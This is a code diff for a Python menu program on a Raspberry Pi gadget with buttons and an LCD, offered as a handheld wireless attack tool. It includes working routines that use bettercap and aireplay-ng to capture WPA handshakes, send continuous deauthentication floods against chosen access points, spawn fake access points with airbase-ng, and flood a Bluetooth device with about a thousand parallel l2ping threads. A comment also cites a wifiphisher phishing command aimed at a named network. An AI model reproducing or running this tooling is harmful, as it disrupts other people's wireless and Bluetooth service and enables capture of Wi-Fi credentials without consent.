@@ -15,10 +15,17 @@ from lib.wifinetworks import wifi_info
 from lib.mojstd import *
 
 scroll_offset = 0
+selected_index = 0
+handshakes = 1 #on
 max_visible_options = 7
 Exit = "<---------Exit--------->"
 
 #@functools.lru_cache(maxsize=236)
+def bk():
+    if GPIO.input(KEY3_PIN) == 0:
+            return True
+
+
 def draw_menu(selected_index):
     global scroll_offset
     draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))
@@ -49,10 +56,11 @@ def draw_menu(selected_index):
     # Display the updated image
     disp.LCD_ShowImage(image, 0, 0)
 
-menu_options = ["Networks","Bluetooth", "Payload", "Party", "App & Plugin", "Shutdown"]
+
 selected_index = 0
-
-
+b = 1
+nevergonnagiveuup = ["Never Gonna Give You Up", "Never Gonna Let You Down", "Never Gonna Run Around", "And DesertYou", "Never Gonna Make You Cry", "Never Gonna Say Good", "Never Gonna Tell A Lie", "And Hurt "]
+a = nevergonnagiveuup[0]
 
 
 #############################################################################################
@@ -65,69 +73,69 @@ selected_index = 0
 
 
 while True:
+    menu_options = ["Networks","Bluetooth", "Reboot", "Shutdown"]
     draw_menu(selected_index)
 
     if GPIO.input(KEY_UP_PIN) == 0:
         selected_index = (selected_index - 1) % len(menu_options)
         draw_menu(selected_index)
-        time.sleep(0.3)
 
     elif GPIO.input(KEY_DOWN_PIN) == 0:
         selected_index = (selected_index + 1) % len(menu_options)
         draw_menu(selected_index)
-        time.sleep(0.3)
 
     elif GPIO.input(KEY_PRESS_PIN) == 0:
 
         selected_option = menu_options[selected_index]
 
         if selected_option == "Networks":
-            # Draw and handle the Network sub-menu
-            menu_options = ["Wifi", "Deauth", "Firewall"]
-            selected_index = 0
-
             # NETWORKS
             time.sleep(0.25)
             while True:
+                menu_options = ["Wifi"]
                 draw_menu(selected_index)
 
                 if GPIO.input(KEY_UP_PIN) == 0:
                     selected_index = (selected_index - 1) % len(menu_options)
                     draw_menu(selected_index)
-                    time.sleep(0.3)
 
                 elif GPIO.input(KEY_DOWN_PIN) == 0:
                     selected_index = (selected_index + 1) % len(menu_options)
                     draw_menu(selected_index)
-                    time.sleep(0.3)
+
+                elif bk() == True:
+                    show_message("Retring...", 0.5)
+                    break
 
                 elif GPIO.input(KEY_PRESS_PIN) == 0:
                     selected_option = menu_options[selected_index]
 
                     if selected_option == "Wifi":
-                        menu_options = ["Pwnagotchi", "Wifiphisher", "Handshakes", "Deauth all"]
-                        selected_index = 0
-
                         #WIFI
 
                         time.sleep(0.30)
+                        selected_index = 0
                         while True:
-                            draw_menu(selected_index)
+                            menu_options = ["Fake AP", "Handshakes", "Deauth all"]
 
+                            draw_menu(selected_index)
                             if GPIO.input(KEY_UP_PIN) == 0:
                                 selected_index = (selected_index - 1) % len(menu_options)
                                 draw_menu(selected_index)
-                                time.sleep(0.3)
 
                             elif GPIO.input(KEY_DOWN_PIN) == 0:
                                 selected_index = (selected_index + 1) % len(menu_options)
                                 draw_menu(selected_index)
-                                time.sleep(0.3)
+
+                            elif bk() == True:
+                                show_message("Retring...", 0.5)
+                                break
 
                             elif GPIO.input(KEY_PRESS_PIN) == 0:
                                 selected_option = menu_options[selected_index]
 
                                 if selected_option == "Handshakes":
+                                    show_message("Loading...", 0.3)
                                     wifi_info().main()
                                     menu_options = []
                                     selected_index = 0
@@ -138,20 +146,24 @@ while True:
                                     dictdionary = {}
 
                                     for item in data:
-                                            menu_options.append(item['ssid'])
-                                            dictdionary[item['ssid']] = item['bssid']
+                                        menu_options.append(item['ssid'])
+                                        dictdionary[item['ssid']] = item['bssid']
 
-                                    while True:
+                                    selected_index = 0
+                                    while handshakes == 1:
                                             draw_menu(selected_index)
+
                                             if GPIO.input(KEY_UP_PIN) == 0:
                                                 selected_index = (selected_index - 1) % len(menu_options)
                                                 draw_menu(selected_index)
-                                                time.sleep(0.3)
 
                                             elif GPIO.input(KEY_DOWN_PIN) == 0:
                                                 selected_index = (selected_index + 1) % len(menu_options)
                                                 draw_menu(selected_index)
-                                                time.sleep(0.3)
+
+                                            elif bk() == True:
+                                                show_message("Retring...", 0.5)
+                                                break
 
                                             elif GPIO.input(KEY_PRESS_PIN) == 0:
                                                 selected_option = menu_options[selected_index]
@@ -164,70 +176,100 @@ while True:
                                                     'set wifi.recon channel 8',
                                                     'set net.sniff.verbose true',
                                                     'set net.sniff.filter ether proto 0x888e',
-                                                    'set net.sniff.output wpa.pcap',
+                                                    f'set net.sniff.output wpa({selected_bssid}).pcap',
                                                     'net.sniff on',
                                                     f'wifi.deauth {selected_bssid}'
                                                 ]
 
                                                 show_message("Wait please...")
-                                                #os.system("sudo airmon-ng moncheck kill")
-                                                #time.sleep(1)
                                                 os.system("sudo iw wlan0 interface add mon0 type monitor")
+                                                time.sleep(1)
                                                 os.system("sudo airmon-ng start mon0")
-                                                os.system("sudo airmon-ng check mon0 && sudo airmon-ng check kill")
+                                                #os.system("sudo airmon-ng check mon0 && sudo airmon-ng check kill")
+                                                show_message("mon0 ready!")
 
-                                                #os.system("sudo iwconfig wlan0 mode monitor")
-
-                                                time.sleep(2)
-                                                bettercap_process = subprocess.Popen(
-                                                    ['sudo', 'bettercap', '-iface', 'mon0'],
-                                                    stdin=subprocess.PIPE,
-                                                    stdout=subprocess.PIPE,
-                                                    stderr=subprocess.PIPE,
-                                                    text=True,
-                                                    bufsize=1 #sono piccole memorie in cui vengono storati le cose temporaneamente, i byte vengono letti a blocchi è  più veloce
-                                                )
-
-                                                if os.path.exists("wpa.pcap") == True:
-                                                        print(commands[5])
-                                                        commands[5] = f'set net.sniff.output wpa({selected_bssid}).pcap'
-
-                                                time.sleep(0.5)
-                                                for i in commands:
-                                                    show_message("Loading ...")
-                                                    time.sleep(2)
-                                                    bettercap_process.stdin.write(i+'\n')
-                                                    bettercap_process.stdin.flush()
-                                                    show_message(bettercap_process.stdout.readline(),2)
-                                                    #
-                                                    with open("output.txt", 'a') as file:
-                                                        file.write(bettercap_process.stdout.readline())
-
-
-                                                    #show_message(i, 1)
-
-                                                try:
-                                                    while True:
-                                                        output = bettercap_process.stdout.readline()
-                                                        #if output == '' and bettercap_process.poll() is not None:
-                                                        #   break
-                                                        if output:
-                                                            print(output.strip())
-                                                except KeyboardInterrupt:
-                                                    # Terminate the Bettercap process if needed
-                                                    bettercap_process.terminate()
-                                                    bettercap_process.wait()  # Wait for the process to terminate
-
-                                                if os.path.exists(f"wpa({selected_bssid}).pcap") == True:
-                                                    show_message("Handshake captured!",1)
-                                                    show_message("retring...")
+                                                # KEY3
+                                                if bk() == True:
+                                                    show_message("Retring...", 0.5)
                                                     break
-                                        #break
 
+                                                show_message("Wait please...")
+                                                time.sleep(1)
+
+                                                #Handshake alredyc captured --> break
+                                                if os.path.exists(f"'wpa({selected_bssid}).pcap'") == True:
+                                                    show_message("Handshake alredy captured", 1)
+                                                    os.system("sudo systemctl start NetworkManager")
+                                                    show_message("Retring...")
+                                                    break
+
+                                                elif bk() == True:
+                                                        show_message("Retring...", 0.5)
+                                                        break
+
+                                                else:
+                                                    bettercap_process = subprocess.Popen(
+                                                        ['sudo', 'bettercap', '-iface', 'mon0'],
+                                                        stdin=subprocess.PIPE,
+                                                        stdout=subprocess.PIPE,
+                                                        stderr=subprocess.PIPE,
+                                                        text=True,
+                                                        bufsize=1 #sono piccole memorie in cui vengono storati le cose temporaneamente, i byte vengono letti a blocchi è  più veloce
+                                                    )
+
+                                                    time.sleep(0.5)
+                                                    for i in commands:
+
+                                                        #key3
+                                                        if bk() == True:
+                                                            show_message("Retring...", 0.5)
+                                                            handshakes = 0
+                                                            break
+
+                                                        time.sleep(2)
+                                                        show_message(f"Loading ({commands.index(i)})...", 0.5)
+                                                        bettercap_process.stdin.write(i+'\n')
+
+                                                        #key3
+                                                        if bk() == True:
+                                                            show_message("Retring...", 0.5)
+                                                            handshakes = 0
+                                                            break
+
+                                                        bettercap_process.stdin.flush()
+                                                        show_message("Capturing handshakes...", 1)
+                                                        #Write output
+                                                        with open("output.txt", 'a') as file:
+                                                            file.write(bettercap_process.stdout.readline())
+
+                                                        break
+
+                                                    if handshakes == 0:
+                                                        selected_index = 0
+                                                        break
+
+                                                    show_message("this might take some time...", 2)
+                                                    show_message("""When the handshake
+        is captured,
+        you'll be notified
+        and you'll be
+        brought back to the
+        previous menu""", 2.5)
+
+                                                    if os.path.exists(f"'wpa({selected_bssid}).pcap'") == True:
+                                                        show_message("Handshake captured!",1)
+                                                        os.system("sudo systemctl start NetworkManager")
+                                                        show_message("Retring...")
+                                                        break
+
+                                                    elif bk() == True:
+                                                        selected_index = 0
+                                                        break
+
+                                #DEAUTH ALL
                                 elif selected_option == "Deauth all":
                                     wifi_info().main()
                                     menu_options = []
-                                    selected_index = 0
 
                                     with open("wifiinfo.json", mode="r") as a:
                                         data = json.load(a)
@@ -238,27 +280,30 @@ while True:
                                             menu_options.append(item['ssid'])
                                             dictdionary[item['ssid']] = item['bssid']
                                             dictdionary[item['bssid']] = item['chan']
-                                    print(dictdionary['Vodafone-34821617'])
+
                                     menu_options.append(Exit)
-                                    show_message("Loading...")
+                                    show_message("Loading...",1 )
+
+                                    selected_index = 0
                                     while True:
-                                            #show_message("Loading...", 1)
+
                                         draw_menu(selected_index)
                                         if GPIO.input(KEY_UP_PIN) == 0:
-                                                selected_index = (selected_index - 1) % len(menu_options)
-                                                draw_menu(selected_index)
-                                                time.sleep(0.3)
+                                            selected_index = (selected_index - 1) % len(menu_options)
+                                            draw_menu(selected_index)
 
                                         elif GPIO.input(KEY_DOWN_PIN) == 0:
-                                                selected_index = (selected_index + 1) % len(menu_options)
-                                                draw_menu(selected_index)
-                                                time.sleep(0.3)
+                                            selected_index = (selected_index + 1) % len(menu_options)
+                                            draw_menu(selected_index)
+
+                                        elif bk() == True:
+                                            show_message("Retring...", 0.5)
+                                            selected_index = 0
+                                            break
+
 
                                         elif GPIO.input(KEY_PRESS_PIN) == 0:
                                                 selected_option = menu_options[selected_index]
-                                                if selected_option == Exit:
-                                                    show_message("Retring...")
-                                                    break
                                                 selected_bssid = dictdionary[selected_option]
                                                 selected_chan = dictdionary[selected_bssid]
                                                 print("info: "+selected_option+" "+selected_bssid+" "+str(selected_chan))
@@ -287,11 +332,15 @@ while True:
                                                 time.sleep(3)
                                                 show_message("Press Key_3 to go back...")
                                                 command = ['sudo', 'aireplay-ng','--deauth', '0', '-a', selected_bssid, 'mon0']
+
                                                 deauthall = subprocess.run(command, text=True, capture_output=True)
 
+                                                if  GPIO.input(KEY3_PIN) == 0:
+                                                    show_message("Retring...", 0.5)
+                                                    break
 
 
-                                                if deauthall.returncode != 0:
+                                                elif deauthall.returncode != 0:
                                                             show_message(f"Error: {deauthall.stderr}", 2)
                                                             with open("output1.txt", 'a') as file:
                                                                 command_string = ' '.join(command)
@@ -312,7 +361,6 @@ while True:
                                                                 command_string = ' '.join(command)
                                                                 file.write(f"command: {command_string}\n")
                                                                 file.write(deauthall.stdout)
-                                        break
 
 
 
@@ -323,46 +371,72 @@ while True:
 
 
 
-                            """elif selected_option == 'Jam':
-                                    show_message("Wait please...")
-                                                #os.system("sudo airmon-ng moncheck kill")
-                                                #time.sleep(1)
-                                    os.system("sudo iw wlan0 interface add mon0 type monitor")
-                                    os.system("sudo airmon-ng start mon0")
-                                    os.system("sudo airmon-ng check mon0 && sudo airmon-ng check kill")
+                                #Fake AP
+                                elif selected_option == 'Fake AP':
+                                    selected_index = 0
 
-                                    show_message("waiting 5s ...")
-                                    time.sleep(5)
-                                    show_message("JAMMING STARTED",5)
-                                    for i in range(0, 5000):
-                                        os.system("aireplay-ng -a ")
+                                    while True:
+                                        menu_options = ["NeverGonnaGiveYouUp", "Random"]
+                                        draw_menu(selected_index)
+                                        
+                                        if GPIO.input(KEY_UP_PIN) == 0:
+                                            selected_index = (selected_index - 1) % len(menu_options)
+                                            draw_menu(selected_index)
 
-                                    with open("wifip_output.txt" , 'a') as file:
-                                        file.write(wifiphisher.stdout)
-                                        show_message(wifiphisher.stdout)"""
+                                        elif GPIO.input(KEY_DOWN_PIN) == 0:
+                                            selected_index = (selected_index + 1) % len(menu_options)
+                                            draw_menu(selected_index)
 
-                                    #os.system('sudo wifiphisher -i mon0 -p firmware-upgrade -e "Vodafone-34821617"')
+                                        elif bk() == True:
+                                            show_message("Retring...", 0.5)
+                                            break
+
+                                        elif GPIO.input(KEY_PRESS_PIN) == 0:
+                                            selected_option = menu_options[selected_index]
+                                            show_message("Wait please...")
+
+                                            if selected_option == "NeverGonnaGiveYouUp":
+                                                time.sleep(1)
+                                                os.system("sudo airmon-ng start wlan1")
+                                                os.system("sudo airmon-ng check wlan1 && sudo airmon-ng check kill")
+                                                os.system("sudo airmon-ng start wlan1")
+
+                                                show_message("waiting 5s ...")
+                                                time.sleep(5)
+
+                                            def RickRoll(a, b):
+                                                
+                                                os.system(f"sudo airbase-ng -e {a} -c {b} wlan1")
+
+                                            for i in range(0, 7):
+                                                show_message(f"""Dossing
+    {mac} . . .""")
+                                                BleDos = threading.Thread(target=RickRoll, args=[str(a, b)]).start()
+                                                a += 1
+                                                b += 1
+                                                        
+
+
         elif selected_option == "Bluetooth":
-            # Draw and handle the Network sub-menu
-            menu_options = ["Dos", "Multiple attacks"]
             selected_index = 0
             time.sleep(0.20)
-            #
 
             while True:
-
+                menu_options = ["Dos", "Multiple attacks"]
                 draw_menu(selected_index)
 
 
                 if GPIO.input(KEY_UP_PIN) == 0:
                         selected_index = (selected_index - 1) % len(menu_options)
                         draw_menu(selected_index)
-                        time.sleep(0.3)
 
                 elif GPIO.input(KEY_DOWN_PIN) == 0:
                     selected_index = (selected_index + 1) % len(menu_options)
                     draw_menu(selected_index)
-                    time.sleep(0.3)
+
+                elif bk() == True:
+                    show_message("Retring...", 0.5)
+                    break
 
                 elif GPIO.input(KEY_PRESS_PIN) == 0:
                     selected_option = menu_options[selected_index]
@@ -380,9 +454,14 @@ while True:
                             menu_options.append(i)
 
                         time.sleep(0.25)
+                        selected_index = 0
+                        BLUEDOS = 1
                         while True:
-                            draw_menu(selected_index)
+                            if BLUEDOS == 0:
+                                show_message("Quitting DOS...")
+                                time.sleep(2.5)
 
+                            draw_menu(selected_index)
 
                             if GPIO.input(KEY_UP_PIN) == 0:
                                 selected_index = (selected_index - 1) % len(menu_options)
@@ -392,34 +471,87 @@ while True:
                                 selected_index = (selected_index + 1) % len(menu_options)
                                 draw_menu(selected_index)
 
+                            elif bk() == True:
+                                show_message("Retring...", 0.5)
+                                break
+
                             elif GPIO.input(KEY_PRESS_PIN) == 0:
                                 selected_option = menu_options[selected_index]
 
                                 #while True:
                                 mac = str(selected_option)
                                 print(mac)
+                                os.system("sudo " + "hciconfig " + "hci0 " + "up")
+                                time.sleep(1)
                                 def DOS(a):
-                                        os.system("sudo " + "hciconfig " + "hci0 " + "up")
-                                        time.sleep(1)
-                                        #os.system('sudo l2ping -i hci0 -s 600 -f '+ mac)
-                                        subprocess.run(['sudo', 'l2ping', '-i', 'hci0', '-s', '600', '-f', a], capture_output=True, text=True)
-                                        #print(a)
-                                        #if result.stdout == "Can't connect: Host is down":
-                                          #   show_message("Error: HOST IS DOWN", 1)
-                                            #break
+                                        os.system('sudo l2ping -i hci0 -s 600 -f '+ mac)
 
-
-
-                                for i in range(0, 1025, 1):
+                                for i in range(0, 1023, 1):
                                     show_message(f"""Dossing
     {mac} . . .""")
-                                    threading.Thread(target=DOS, args=[str(mac)]).start()
+                                    BleDos = threading.Thread(target=DOS, args=[str(mac)]).start()
 
-                                    if GPIO.input(KEY3_PIN) == 0:
-                                        show_message("Exiting", 1)
-                                        break
-                                break
+                                    #if bk() == True:
+                                     #   BLUEDOS = 0
+                                      #  BleDos.threading.Event()
+                                       # time.slee(1)
+                                        #show_message("Retring...", 0.5)
+                                        #break
 
+        elif selected_option == "Reboot":
+            menu_options = ["Yes", "No"]
+            selected_index = 0
 
-                    elif selected_option == "Multiple attacks":
-                        pass
+            time.sleep(0.5)
+            while True:
+                draw_menu(selected_index)
+                if GPIO.input(KEY_UP_PIN) == 0:
+                                selected_index = (selected_index - 1) % len(menu_options)
+                                draw_menu(selected_index)
+
+                elif GPIO.input(KEY_DOWN_PIN) == 0:
+                    selected_index = (selected_index + 1) % len(menu_options)
+                    draw_menu(selected_index)
+
+                elif bk() == True:
+                    show_message("Retring...", 0.5)
+                    break
+
+                elif GPIO.input(KEY_PRESS_PIN) == 0:
+                    selected_option = menu_options[selected_index]
+
+                    if selected_option == "Yes":
+                        show_message("Rebooting...", 10)
+                        os.system("sudo reboot now")
+
+                    else:
+                        break
+
+        elif selected_option == "Shutdown":
+            menu_options = ["Yes", "No"]
+            selected_index = 0
+
+            time.sleep(0.5)
+            while True:
+                draw_menu(selected_index)
+                if GPIO.input(KEY_UP_PIN) == 0:
+                    selected_index = (selected_index - 1) % len(menu_options)
+                    draw_menu(selected_index)
+
+                elif GPIO.input(KEY_DOWN_PIN) == 0:
+                    selected_index = (selected_index + 1) % len(menu_options)
+                    draw_menu(selected_index)
+
+                elif  GPIO.input(KEY3_PIN) == 0:
+                    show_message("Retring...", 0.5)
+                    break
+
+                elif GPIO.input(KEY_PRESS_PIN) == 0:
+                    selected_option = menu_options[selected_index]
+
+                    if selected_option == "Yes":
+                        show_message("Shutting down mojito...", 10)
+                        os.system("sudo shutdown now")
+
+                    else:
+                        break
